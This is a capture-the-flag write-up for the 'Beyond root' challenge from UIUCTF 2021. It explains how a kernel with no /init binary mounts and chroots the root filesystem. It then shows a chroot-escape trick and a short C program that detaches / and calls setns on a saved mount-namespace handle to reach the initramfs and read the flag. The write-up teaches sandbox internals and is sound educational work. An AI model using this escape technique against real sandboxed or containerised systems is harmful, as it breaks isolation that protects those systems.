---
layout: post
title:  "Beyond root (UIUCTF 2021)"
date:   2021-08-09
categories: writeups
author: Joey Geralnik
tags: linux, kernel, namespace, sandbox
---
In this challenge we are given shell access to a system and need to access the flag which is in initrd. There are lots of moving components so making sense of what exactly is happening takes some time.

We start with a Dockerfile where the kernel was compiled:

```
RUN mkdir /initrd
RUN mkdir /initrd/dev /initrd/root /initrd/bin

COPY --from=busybox-grab /bin/busybox /initrd/bin/

COPY src/flag /initrd/
```

Inside of kernel/kconfig we find

```
CONFIG_INITRAMFS_SOURCE="/initrd"
```

So the /initrd folder is copied into the kernel image and mounted when the kernel boots.

Our docker then calls `socat TCP-LISTEN:1337,reuseaddr,fork EXEC:'kctf_pow nsjail --config /home/user/nsjail.cfg -- /home/user/qemud /home/user/bzImage'`
This is more noise than important information, but confused me for a while during the challenge because we are running qemu via nsjail inside of a docker. We can ignore all of the extra layers and just focus on the image running inside of qemu.


## Why no panic?
Note that there is no `init` binary inside of the initramfs. Why doesn't this panic?

If we look at the [kernel_init](https://elixir.bootlin.com/linux/v5.12.14/source/init/main.c#L1424) function in the kernel we can see that it first calls `kernel_init_freeable()`. This [checks](https://elixir.bootlin.com/linux/v5.12.14/source/init/main.c#L1547) if we have a `/init` binary, and if not calls `prepare_namespace()`.

`prepare_namespace` mounts the root filesystem with [do_mount_root](https://elixir.bootlin.com/linux/v5.12.14/source/init/do_mounts.c#L374) which does

```c
ret = init_mount(name, "/root", fs, flags, data_page);
if (ret)
    goto out;

init_chdir("/root");
```

and then [calls](https://elixir.bootlin.com/linux/v5.12.14/source/init/do_mounts.c#L616):

```c
init_mount(".", "/", NULL, MS_MOVE, NULL);
init_chroot(".");
```

So, to summarize the flow - if there is no /init binary, we mount the root filesystem to /root, chdir to /root, mount --move . /, and chroot .

## Escaping chroot
If not for the mount --move we would just have to escape a chroot. Escaping chroot is usually pretty easy.

Let's say we have a folder /root that we chroot into. We can create a new chroot while keeping a reference to our root directory, and then go back up a level:

```
/ # mkdir /root
/ # cp -r /bin/ /usr /root
/ # chroot /root/
/ # ls
bin  usr

/ # mkdir /inner
/ # cp -r bin usr inner
/ # mychroot /inner/
sh: getcwd: No such file or directory
(unknown) # ls -l /
total 8
drwxr-xr-x    2 0        0             4096 Aug  9 12:37 bin
drwxr-xr-x    5 0        0             4096 Aug  9 12:37 usr
sh: getcwd: No such file or directory
(unknown) # cd ..
sh: getcwd: No such file or directory
(unknown) # ls
bin         etc         lost+found  root        sys         usr
dev         linuxrc     proc        sbin        tmp
```

Here mychroot is just a small binary I compiled since busybox's chroot always cd's into the chroot directory first:

```c
int main(int argc, char* argv[]) {
    chroot(argv[1]);
    execl("/bin/sh", "/bin/sh", NULL);
}
```

Unfortunately, there is no way to access the original initrd filesystem because even outside of the chroot the rootfs is still mounted on /

## Umount root
We can also try to umount / with `umount -l /`. 
This works, but the system ends up in a weird state where / is still the root filesystem, all other mounts are umounted (/proc, /dev), and we can no longer mount new filesystems (such as remounting /proc). We still don't have access to the underneath filesystem because we are still inside the chroot.

Even combining this with the previous trick doesn't work because going up a directory will never get us to the initramfs.

## Solution
I was stuck here for a while until I came upon a [stack overflow post](https://unix.stackexchange.com/questions/583138/why-does-initramfs-need-to-overmount-rootfs-with-the-new-root) with the solution.

After umounting / the root inside of our namespace (outside of the chroot) is the initrd. If we open a handle to /proc/self/ns/mnt (before we screw up the /proc mount) then we can use setns to reenter our namespace and access the root file system (effectively escaping the chroot).

Here's the code:

```c
#define _GNU_SOURCE

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>

int main() {
    int ns = open("/proc/self/ns/mnt", O_RDONLY);
    if (ns == -1) {
        perror("open");
        goto out;
    }

    if (umount2("/", MNT_DETACH)) {
        perror("umount2");
        goto out;
    }

    if (setns(ns, CLONE_NEWNS)) {
        perror("setns");
        goto out;
    }

    char *a[] = { "/bin/busybox", "sh", NULL };
    char *e[] = { NULL };
    execve(a[0], a, e);

    perror("execve");

out:
    return 1;
}
```

We upload it to the server and give it a go:

```
/ # chmod +x win
/ # ./win
/ # ./bin/busybox ls
bin   dev   flag  root
/ # ./bin/busybox cat flag
uiuctf{oh_I_have_root_oh_wait_its_outside_root_6da726b5}
```
